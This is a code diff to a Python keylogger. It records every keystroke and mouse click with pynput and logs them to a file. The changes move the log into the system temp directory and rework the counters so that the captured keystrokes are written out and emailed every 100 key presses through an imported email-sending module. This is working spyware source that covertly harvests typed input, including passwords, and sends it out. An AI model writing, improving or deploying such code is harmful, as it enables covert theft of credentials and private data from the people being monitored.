@@ -4,21 +4,22 @@
 
 import pynput
 from pynput import mouse
-
 import emailsender
-
-
-
+import os
+import tempfile
 from pynput.keyboard import Key, Listener
 
 count = 0
+count2=0
 keys=[]
 mouseflag=1
+
+log_path = os.path.join(tempfile.gettempdir(), "log.txt")
 
 #def for writing to file, cleaning it up so it looks nice and clean
 def write_file(keys):
     #open the file in append mode
-    with open("log.txt", "a") as f:
+    with open(log_path, "a") as f:
         #for every key entered
         for key in keys:
             #replace the keys string key with an empty slot
@@ -48,21 +49,22 @@ def on_click(pressed):
 
 #commamand for on press                
 def on_press(key):
-    global keys, count
+    global keys, count, count2
     keys.append(key)
     count+=1
+    count2+=1
     print("{0} pressed".format (key))
 
 
-    if count >= 100:
-            count=0
+    if count2 >= 100:
+            count2=0
             write_file(keys)
             keys=[]
             #send the mail
             emailsender.sendmail()
             
     #if the count is greater than 10 save to file
-    if count >= 10:
+    elif count >= 10:
         count=0
         write_file(keys)
         keys=[]
@@ -100,7 +102,7 @@ def startlog():
     #wipe the text file and start listening
     with Listener(on_press=on_press, on_release =on_release) as listener:
         with mouse.Listener(on_click=on_click) as listener2:
-            with open("log.txt", "w") as wipe:
+            with open(log_path, "w") as wipe:
                 wipe.close()
             #two listeners one for keyboard one for mouse
             listener.join()
